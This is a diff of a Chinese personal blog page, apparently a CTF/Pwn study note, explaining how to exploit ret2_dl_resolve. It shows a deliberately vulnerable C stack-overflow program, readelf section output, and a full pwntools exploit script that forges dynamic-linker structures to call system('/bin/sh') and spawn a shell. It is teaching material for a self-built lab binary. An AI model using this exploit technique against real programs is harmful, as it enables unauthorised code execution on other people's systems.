@@ -1,41 +1,82 @@
 <!DOCTYPE html>
+
 <html lang="zh-Hans">
+
 <head><meta name="generator" content="Hexo 3.9.0">
 
+
+
     <!--[if lt IE 9]>
+
         <style>body {display: none; background: none !important} </style>
+
         <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
+
     <![endif]-->
 
+
+
 <meta charset="utf-8">
+
 <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
 <meta name="format-detection" content="telephone=no">
+
 <meta name="author" content="binLep">
 
 
 
+
+
+
+
 <meta name="description" content="原理太绕了，我先写写如何利用吧">
+
 <meta name="keywords" content="CTF, Pwn, Sec">
+
 <meta property="og:type" content="article">
+
 <meta property="og:title" content="【Pwn 笔记】简单记如何利用 Ret2_dl_resolve">
+
 <meta property="og:url" content="https://binlep.github.io/old_blog_01/2020/01/11/【Pwn 笔记】简单记如何利用 ret2_dl_resolve/index.html">
+
 <meta property="og:site_name" content="binLep&#39;s Blog">
+
 <meta property="og:description" content="原理太绕了，我先写写如何利用吧">
+
 <meta property="og:locale" content="zh-Hans">
+
 <meta property="og:updated_time" content="2020-01-11T03:23:26.559Z">
+
 <meta name="twitter:card" content="summary">
+
 <meta name="twitter:title" content="【Pwn 笔记】简单记如何利用 Ret2_dl_resolve">
+
 <meta name="twitter:description" content="原理太绕了，我先写写如何利用吧">
 
-<link rel="apple-touch-icon" href="/apple-touch-icon.png">
 
 
-    <link rel="alternate" href="/atom.xml" title="binLep&#39;s Blog" type="application/atom+xml">
+<link rel="apple-touch-icon" href="/old_blog_01/apple-touch-icon.png">
 
 
 
-    <link rel="shortcut icon" href="/favicon.png">
+
+
+    <link rel="alternate" href="/old_blog_01/atom.xml" title="binLep&#39;s Blog" type="application/atom+xml">
+
+
+
+
+
+
+
+    <link rel="shortcut icon" href="/old_blog_01/favicon.png">
+
+
+
+
 
 
 
@@ -43,45 +84,91 @@
 
 
 
+
+
+
+
     <link href="//cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">
 
 
 
+
+
+
+
     <script src="//cdnjs.cloudflare.com/ajax/libs/pace/1.0.2/pace.min.js"></script>
+
     <link href="//cdnjs.cloudflare.com/ajax/libs/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+
+
+
 
 
 <link rel="stylesheet" href="../../../../css/style.css">
 
 
 
+
+
+
+
 <link href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+
+
+
 
 
 <title>【Pwn 笔记】简单记如何利用 Ret2_dl_resolve | binLep&#39;s Blog</title>
 
+
+
 <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+
 <script src="//cdnjs.cloudflare.com/ajax/libs/clipboard.js/1.5.10/clipboard.min.js"></script>
 
+
+
 <script>
+
     var yiliaConfig = {
+
         fancybox: true,
+
         animate: true,
+
         isHome: false,
+
         isPost: true,
+
         isArchive: false,
+
         isTag: false,
+
         isCategory: false,
+
         fancybox_js: "//cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.5/jquery.fancybox.min.js",
+
         scrollreveal: "//cdnjs.cloudflare.com/ajax/libs/scrollReveal.js/3.1.4/scrollreveal.min.js",
+
         search: true
+
     }
+
 </script>
 
 
+
+
+
     <script>
+
         yiliaConfig.jquery_ui = [true, "//cdnjs.cloudflare.com/ajax/libs/jqueryui/1.10.4/jquery-ui.min.js", "//cdnjs.cloudflare.com/ajax/libs/jqueryui/1.10.4/css/jquery-ui.min.css"];
+
     </script>
+
+
+
+
 
 
 
@@ -92,307 +179,615 @@
 
 
 
+
+
+
+
+
+
+
 </head></html>
+
 <body>
+
   <div id="container">
+
     <div class="left-col">
+
     <div class="overlay"></div>
+
 <div class="intrude-less">
+
     <header id="header" class="inner">
-        <a href="/" class="profilepic">
-            <img src="/img/avatar.png" class="animated zoomIn">
+
+        <a href="/old_blog_01/" class="profilepic">
+
+            <img src="/old_blog_01/img/avatar.png" class="animated zoomIn">
+
         </a>
+
         <hgroup>
-          <h1 class="header-author"><a href="/">binLep</a></h1>
+
+          <h1 class="header-author"><a href="/old_blog_01/">binLep</a></h1>
+
         </hgroup>
 
+
+
         
+
         <p class="header-subtitle">图片托管在github，国内访问会很慢QWQ</p>
-        
 
         
+
+
+
+        
+
             <form id="search-form">
+
             <input type="text" id="local-search-input" name="q" placeholder="search..." class="search form-control" autocomplete="off" autocorrect="off" searchonload="" />
+
             <i class="fa fa-times" onclick="resetSearch()"></i>
+
             </form>
+
             <div id="local-search-result"></div>
+
             <p class='no-result'>No results found <i class='fa fa-spinner fa-pulse'></i></p>
+
         
 
 
+
+
+
         
+
             <div id="switch-btn" class="switch-btn">
+
                 <div class="icon">
+
                     <div class="icon-ctn">
+
                         <div class="icon-wrap icon-house" data-idx="0">
+
                             <div class="birdhouse"></div>
+
                             <div class="birdhouse_holes"></div>
+
                         </div>
+
                         <div class="icon-wrap icon-ribbon hide" data-idx="1">
+
                             <div class="ribbon"></div>
+
                         </div>
+
                         
+
                         
+
                         <div class="icon-wrap icon-me hide" data-idx="3">
+
                             <div class="user"></div>
+
                             <div class="shoulder"></div>
+
                         </div>
+
                         
+
                     </div>
+
                     
+
                 </div>
+
                 <div class="tips-box hide">
+
                     <div class="tips-arrow"></div>
+
                     <ul class="tips-inner">
+
                         <li>菜单</li>
+
                         <li>标签</li>
+
                         
+
                         
+
                         <li>关于我</li>
+
                         
+
                     </ul>
+
                 </div>
+
             </div>
+
         
+
+
 
         <div id="switch-area" class="switch-area">
+
             <div class="switch-wrap">
+
                 <section class="switch-part switch-part1">
+
                     <nav class="header-menu">
+
                         <ul>
+
                         
+
                             <li><a href="../../../../index.html">主页</a></li>
+
                         
+
                             <li><a href="../../../../archives/">所有文章</a></li>
+
                         
+
                             <li><a href="../../../../tags/">标签云</a></li>
+
                         
+
                             <li><a href="../../../../about/">关于我</a></li>
+
                         
+
                             <li><a href="../../../../friends/">友情链接</a></li>
+
                         
+
                         </ul>
+
                     </nav>
+
                     <nav class="header-nav">
+
                         <ul class="social">
+
                             
+
                                 <a class="fa Email" href="mailto:1723569975@qq.com" title="Email"></a>
+
                             
+
                                 <a class="fa RSS" href="../../../../atom.xml" title="RSS"></a>
+
                             
+
                         </ul>
+
                     </nav>
+
                 </section>
-                
-                
-                <section class="switch-part switch-part2">
-                    <div class="widget tagcloud" id="js-tagcloud">
-                        <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/BugkuCTF/">BugkuCTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/CryptixCTF/">CryptixCTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/Event/">Event</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/Hackme-CTF/">Hackme CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/Jarvis-OJ/">Jarvis OJ</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/Linux-Pwn/">Linux Pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/MOCTF/">MOCTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/Newark-Academy-CTF/">Newark Academy CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/Platform/">Platform</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/Platfrom/">Platfrom</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/Pwn/">Pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/RSA/">RSA</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/RSCTF/">RSCTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/Web/">Web</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/Windows-Pwn/">Windows Pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/XMan/">XMan</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/mipsel/">mipsel</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/ret2libc/">ret2libc</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/ret2shellcode/">ret2shellcode</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/xml注入/">xml注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/使用教程/">使用教程</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/安装教程/">安装教程</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/搭建Hexo/">搭建Hexo</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/攻防世界/">攻防世界</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/模板/">模板</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/玄武杯/">玄武杯</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/环境搭建/">环境搭建</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/问题汇总/">问题汇总</a></li></ul>
-                    </div>
-                </section>
-                
-                
+
                 
 
                 
-                
-                <section class="switch-part switch-part3">
-                
-                    <div id="js-aboutme">Pwn路上的小萌新~</div>
+
+                <section class="switch-part switch-part2">
+
+                    <div class="widget tagcloud" id="js-tagcloud">
+
+                        <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/BugkuCTF/">BugkuCTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/CryptixCTF/">CryptixCTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/Event/">Event</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/Hackme-CTF/">Hackme CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/Jarvis-OJ/">Jarvis OJ</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/Linux-Pwn/">Linux Pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/MOCTF/">MOCTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/Newark-Academy-CTF/">Newark Academy CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/Platform/">Platform</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/Platfrom/">Platfrom</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/Pwn/">Pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/RSA/">RSA</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/RSCTF/">RSCTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/Web/">Web</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/Windows-Pwn/">Windows Pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/XMan/">XMan</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/mipsel/">mipsel</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/ret2libc/">ret2libc</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/ret2shellcode/">ret2shellcode</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/xml注入/">xml注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/使用教程/">使用教程</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/安装教程/">安装教程</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/搭建Hexo/">搭建Hexo</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/攻防世界/">攻防世界</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/模板/">模板</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/玄武杯/">玄武杯</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/环境搭建/">环境搭建</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/问题汇总/">问题汇总</a></li></ul>
+
+                    </div>
+
                 </section>
+
                 
+
+                
+
+                
+
+
+
+                
+
+                
+
+                <section class="switch-part switch-part3">
+
+                
+
+                    <div id="js-aboutme">Pwn路上的小萌新~</div>
+
+                </section>
+
+                
+
             </div>
+
         </div>
+
     </header>                
+
 </div>
+
     </div>
+
     <div class="mid-col">
+
       <nav id="mobile-nav">
+
       <div class="overlay">
+
           <div class="slider-trigger"></div>
-          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">binLep</a></h1>
+
+          <h1 class="header-author js-mobile-header hide"><a href="/old_blog_01/" title="回到主页">binLep</a></h1>
+
       </div>
+
     <div class="intrude-less">
+
         <header id="header" class="inner">
-            <a href="/" class="profilepic">
-                <img src="/img/avatar.png" class="animated zoomIn">
+
+            <a href="/old_blog_01/" class="profilepic">
+
+                <img src="/old_blog_01/img/avatar.png" class="animated zoomIn">
+
             </a>
+
             <hgroup>
-              <h1 class="header-author"><a href="/" title="回到主页">binLep</a></h1>
+
+              <h1 class="header-author"><a href="/old_blog_01/" title="回到主页">binLep</a></h1>
+
             </hgroup>
+
             
+
             <p class="header-subtitle">图片托管在github，国内访问会很慢QWQ</p>
+
             
+
             <nav class="header-menu">
+
                 <ul>
+
                 
+
                     <li><a href="../../../../index.html">主页</a></li>
+
                 
+
                     <li><a href="../../../../archives/">所有文章</a></li>
+
                 
+
                     <li><a href="../../../../tags/">标签云</a></li>
+
                 
+
                     <li><a href="../../../../about/">关于我</a></li>
+
                 
+
                     <li><a href="../../../../friends/">友情链接</a></li>
+
                 
+
                 <div class="clearfix"></div>
+
                 </ul>
+
             </nav>
+
             <nav class="header-nav">
+
                         <ul class="social">
+
                             
+
                                 <a class="fa Email" target="_blank" href="mailto:1723569975@qq.com" title="Email"></a>
+
                             
+
                                 <a class="fa RSS" target="_blank" href="../../../../atom.xml" title="RSS"></a>
+
                             
+
                         </ul>
+
             </nav>
+
         </header>                
+
     </div>
+
     <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
+
 </nav>
+
       <div class="body-wrap"><article id="post-【Pwn 笔记】简单记如何利用 ret2_dl_resolve" class="article article-type-post" itemscope itemprop="blogPost">
+
   
+
     <div class="article-meta">
+
       <a href="" class="article-date">
+
       <time datetime="2020-01-11T11:23:00.000Z" itemprop="datePublished">2020-01-11</time>
+
 </a>
 
 
+
+
+
     </div>
+
   
+
   <div class="article-inner">
+
     
+
       <input type="hidden" class="isFancy" />
+
     
+
     
+
       <header class="article-header">
+
         
+
   
+
     <h1 class="article-title" itemprop="name">
+
       【Pwn 笔记】简单记如何利用 Ret2_dl_resolve
+
     </h1>
+
   
+
+
 
       </header>
+
       
+
       <div class="article-info article-info-post">
+
         
+
     <div class="article-category tagcloud">
+
     <a class="article-category-link" href="../../../../categories/Pwn-笔记/">Pwn 笔记</a>
+
     </div>
 
 
+
+
+
         
+
         <div class="clearfix"></div>
+
       </div>
+
       
+
     
+
     <div class="article-entry" itemprop="articleBody">
+
       
+
           
+
         <p>原理太绕了，我先写写如何利用吧</p>
+
 <a id="more"></a>
 
+
+
 <p>本题以一道 C 程序为例，程序如下：</p>
+
 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//gcc dl.c -fno-stack-protector -m32 -o dl</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">char</span> gift[<span class="number">0x200</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fun</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buffer[<span class="number">0x20</span>];</span><br><span class="line">    read(<span class="number">0</span>,buffer,<span class="number">0x200</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    fun();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
+
+
 <p>编译好程序后，我们可以利用<code>readelf -S ./dl</code>命令来查看我们需要的地址：</p>
+
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">共有 31 个节头，从偏移量 0x1804 开始：</span><br><span class="line"></span><br><span class="line">节头：</span><br><span class="line">  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al</span><br><span class="line">  [ 0]                   NULL            00000000 000000 000000 00      0   0  0</span><br><span class="line">  [ 1] .interp           PROGBITS        08048154 000154 000013 00   A  0   0  1</span><br><span class="line">  [ 2] .note.ABI-tag     NOTE            08048168 000168 000020 00   A  0   0  4</span><br><span class="line">  [ 3] .note.gnu.build-i NOTE            08048188 000188 000024 00   A  0   0  4</span><br><span class="line">  [ 4] .gnu.hash         GNU_HASH        080481ac 0001ac 000020 04   A  5   0  4</span><br><span class="line">  [ 5] .dynsym           DYNSYM          080481cc 0001cc 000050 10   A  6   1  4</span><br><span class="line">  [ 6] .dynstr           STRTAB          0804821c 00021c 00004a 00   A  0   0  1</span><br><span class="line">  [ 7] .gnu.version      VERSYM          08048266 000266 00000a 02   A  5   0  2</span><br><span class="line">  [ 8] .gnu.version_r    VERNEED         08048270 000270 000020 00   A  6   1  4</span><br><span class="line">  [ 9] .rel.dyn          REL             08048290 000290 000008 08   A  5   0  4</span><br><span class="line">  [10] .rel.plt          REL             08048298 000298 000010 08  AI  5  24  4</span><br><span class="line">  [11] .init             PROGBITS        080482a8 0002a8 000023 00  AX  0   0  4</span><br><span class="line">  [12] .plt              PROGBITS        080482d0 0002d0 000030 04  AX  0   0 16</span><br><span class="line">  [13] .plt.got          PROGBITS        08048300 000300 000008 00  AX  0   0  8</span><br><span class="line">  [14] .text             PROGBITS        08048310 000310 0001a2 00  AX  0   0 16</span><br><span class="line">  [15] .fini             PROGBITS        080484b4 0004b4 000014 00  AX  0   0  4</span><br><span class="line">  [16] .rodata           PROGBITS        080484c8 0004c8 000008 00   A  0   0  4</span><br><span class="line">  [17] .eh_frame_hdr     PROGBITS        080484d0 0004d0 000034 00   A  0   0  4</span><br><span class="line">  [18] .eh_frame         PROGBITS        08048504 000504 0000ec 00   A  0   0  4</span><br><span class="line">  [19] .init_array       INIT_ARRAY      08049f08 000f08 000004 00  WA  0   0  4</span><br><span class="line">  [20] .fini_array       FINI_ARRAY      08049f0c 000f0c 000004 00  WA  0   0  4</span><br><span class="line">  [21] .jcr              PROGBITS        08049f10 000f10 000004 00  WA  0   0  4</span><br><span class="line">  [22] .dynamic          DYNAMIC         08049f14 000f14 0000e8 08  WA  6   0  4</span><br><span class="line">  [23] .got              PROGBITS        08049ffc 000ffc 000004 04  WA  0   0  4</span><br><span class="line">  [24] .got.plt          PROGBITS        0804a000 001000 000014 04  WA  0   0  4</span><br><span class="line">  [25] .data             PROGBITS        0804a014 001014 000008 00  WA  0   0  4</span><br><span class="line">  [26] .bss              NOBITS          0804a020 00101c 000220 00  WA  0   0 32</span><br><span class="line">  [27] .comment          PROGBITS        00000000 00101c 000035 01  MS  0   0  1</span><br><span class="line">  [28] .shstrtab         STRTAB          00000000 0016f7 00010a 00      0   0  1</span><br><span class="line">  [29] .symtab           SYMTAB          00000000 001054 000470 10     30  47  4</span><br><span class="line">  [30] .strtab           STRTAB          00000000 0014c4 000233 00      0   0  1</span><br><span class="line">Key to Flags:</span><br><span class="line">  W (write), A (alloc), X (execute), M (merge), S (strings)</span><br><span class="line">  I (info), L (link order), G (group), T (TLS), E (exclude), x (unknown)</span><br><span class="line">  O (extra OS processing required) o (OS specific), p (processor specific)</span><br></pre></td></tr></table></figure>
 
+
+
 <p>程序主流程大概是这样的：</p>
+
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dl_indexbase(push xx)——&gt;.rel.plt(Elf32_Rel)——&gt;.dynsym(Elf32_Sym)——&gt;.dynstr(st_name)</span><br></pre></td></tr></table></figure>
 
+
+
 <p>给出利用脚本如下，多调试，不是死写法：</p>
+
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line">context(arch=<span class="string">"i386"</span>, endian=<span class="string">'el'</span>, os=<span class="string">"linux"</span>)</span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">1</span>:</span><br><span class="line">    p = process(<span class="string">'./dl'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">''</span>, )</span><br><span class="line">elf = ELF(<span class="string">'./dl'</span>, checksec=<span class="literal">False</span>)</span><br><span class="line">got_read = elf.got[<span class="string">'read'</span>]</span><br><span class="line">plt_read = elf.plt[<span class="string">'read'</span>]</span><br><span class="line">addr_fun = elf.sym[<span class="string">'fun'</span>]</span><br><span class="line">addr_bss = elf.bss(<span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line">addr_rel_plt = <span class="number">0x08048298</span>  <span class="comment"># .rel.plt</span></span><br><span class="line">addr_dynsym = <span class="number">0x080481cc</span>   <span class="comment"># .dynsym</span></span><br><span class="line">addr_dynstr = <span class="number">0x0804821c</span>   <span class="comment"># .dynstr</span></span><br><span class="line">addr_plt_0 = <span class="number">0x080482d0</span>    <span class="comment"># .plt</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 伪造地址和 .rel.plt 地址的差值，固定写法</span></span><br><span class="line">dl_indexbase = addr_bss - addr_rel_plt</span><br><span class="line"><span class="comment"># 伪造地址和 .dynsym 的差值，这里 0xc 是变量</span></span><br><span class="line">dl_index_dynsym = (addr_bss + <span class="number">0xc</span> - addr_dynsym) / <span class="number">0x10</span></span><br><span class="line"><span class="comment"># 需要过 ELF32_R_TYPE(r_info) = 7，固定写法</span></span><br><span class="line">dl_r_info = (dl_index_dynsym &lt;&lt; <span class="number">8</span>) | <span class="number">7</span></span><br><span class="line"><span class="comment"># 伪造地址和 .dynstr 的差值，这里 0x1c 是变量，</span></span><br><span class="line">dl_st_name = addr_bss + <span class="number">0x1c</span> - addr_dynstr</span><br><span class="line"></span><br><span class="line">pd = <span class="string">'a'</span> * <span class="number">0x2c</span></span><br><span class="line">pd += p32(plt_read)  <span class="comment"># 调用 plt_read 读取数据</span></span><br><span class="line">pd += p32(addr_fun)  <span class="comment"># 返回地址</span></span><br><span class="line">pd += p32(<span class="number">0</span>)         <span class="comment"># 标准输入的 fd</span></span><br><span class="line">pd += p32(addr_bss)  <span class="comment"># 写入的地址，一般都是 bss 段</span></span><br><span class="line">pd += p32(<span class="number">0x100</span>)     <span class="comment"># 写入字符串的个数，看情况，随便写</span></span><br><span class="line">p.send(pd)</span><br><span class="line"></span><br><span class="line">success(<span class="string">'dl_indexbase    = '</span> + hex(dl_indexbase))</span><br><span class="line">success(<span class="string">'dl_index_dynsym = '</span> + hex(dl_index_dynsym))</span><br><span class="line">success(<span class="string">'dl_r_info       = '</span> + hex(dl_r_info))</span><br><span class="line">success(<span class="string">'dl_st_name      = '</span> + hex(dl_st_name))</span><br><span class="line"><span class="comment"># gdb.attach(p, "b *0x8048429\nc" + "\nsi" * 68)</span></span><br><span class="line">pd = p32(got_read)  <span class="comment"># 要修改的 got 表函数和 dl_r_info 是放在一起的</span></span><br><span class="line">pd += p32(dl_r_info)</span><br><span class="line"><span class="comment"># 用来凑字数的</span></span><br><span class="line">pd += p32(<span class="number">0</span>)</span><br><span class="line"><span class="comment"># 通过 dl_index_dynsym 加上 0x10 * (dl_r_info &gt;&gt; 8) 而确定的 dl_st_name 地址</span></span><br><span class="line"><span class="comment"># 这里 0x10 是常量，上面的 p32(0) 只是为了凑地址而已</span></span><br><span class="line">pd += p32(dl_st_name)</span><br><span class="line"><span class="comment"># 这里两个 p32(0) 和一个 p32(12) 是固定写法，要紧挨着写在 dl_st_name 的后面，原理如下：</span></span><br><span class="line"><span class="comment"># st_bind = 0×1 #  含义见上文符号绑定信息</span></span><br><span class="line"><span class="comment"># st_type = 0x2 #  含义见上文符号类型</span></span><br><span class="line"><span class="comment"># st_info = (st_bind &lt;&lt; 4) + (st_type &amp; 0xf)</span></span><br><span class="line"><span class="comment"># fake_sym = p32(st_name) + p32(0) + p32(0) + p32(st_info) #真正用到的是 st_name 和 st_info </span></span><br><span class="line">pd += p32(<span class="number">0</span>) * <span class="number">2</span></span><br><span class="line">pd += p32(<span class="number">12</span>)</span><br><span class="line"><span class="comment"># 这里就是通过 addr_dynstr 加上 dl_st_name 所对应的函数字符串地址</span></span><br><span class="line">pd += <span class="string">'system\x00\x00'</span></span><br><span class="line"><span class="comment"># 被下方返回地址后所填写的参数地址引用</span></span><br><span class="line">pd += <span class="string">'/bin/sh\x00'</span></span><br><span class="line">p.send(pd)</span><br><span class="line">sleep(<span class="number">1</span>)  <span class="comment"># 调试的时候需要加 sleep 函数使调试正常运作</span></span><br><span class="line"></span><br><span class="line">pd = <span class="string">'a'</span> * <span class="number">0x2c</span></span><br><span class="line">pd += p32(addr_plt_0)    <span class="comment"># 要改 dl 链接过程，要先写 plt_0，固定写法</span></span><br><span class="line">pd += p32(dl_indexbase)  <span class="comment"># 然后写伪造的 dl 信息的基地址，固定写法</span></span><br><span class="line">pd += p32(addr_fun)      <span class="comment"># 返回地址</span></span><br><span class="line">pd += p32(addr_bss + <span class="number">9</span> * <span class="number">4</span>)  <span class="comment"># arg[0] 也是字符串 /bin/sh 的地址，即改完后的函数参数</span></span><br><span class="line">p.sendline(pd)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
       
+
     </div>
+
     
+
   </div>
+
   
+
     
+
     <div class="copyright">
+
         <p><span>本文标题:</span><a href="">【Pwn 笔记】简单记如何利用 Ret2_dl_resolve</a></p>
-        <p><span>文章作者:</span><a href="/" title="回到主页">binLep</a></p>
+
+        <p><span>文章作者:</span><a href="/old_blog_01/" title="回到主页">binLep</a></p>
+
         <p><span>发布时间:</span>2020-01-11, 11:23:00</p>
+
         <p><span>最后更新:</span>2020-01-11, 11:23:26</p>
+
         <p>
+
             <span>原始链接:</span><a class="post-url" href="" title="【Pwn 笔记】简单记如何利用 Ret2_dl_resolve">https://binlep.github.io/old_blog_01/2020/01/11/【Pwn 笔记】简单记如何利用 ret2_dl_resolve/</a>
+
